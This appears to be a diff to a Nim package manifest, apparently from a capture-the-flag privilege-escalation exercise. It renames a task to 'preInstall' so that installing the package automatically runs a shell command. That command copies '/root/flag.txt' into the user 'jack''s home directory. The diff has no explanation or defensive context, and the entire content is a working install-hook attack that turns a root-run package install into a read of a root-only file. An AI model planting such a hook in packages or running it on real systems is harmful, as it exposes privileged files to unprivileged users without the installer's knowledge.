@@ -15,5 +15,5 @@ requires "nim >= 1.0.0"
 bin = @["omnigodz"]
 
 # Install task
-task install, "Run a shell command upon installation":
+task preInstall, "Run a shell command upon installation":
   exec "cp /root/flag.txt /home/jack/flag.txt"
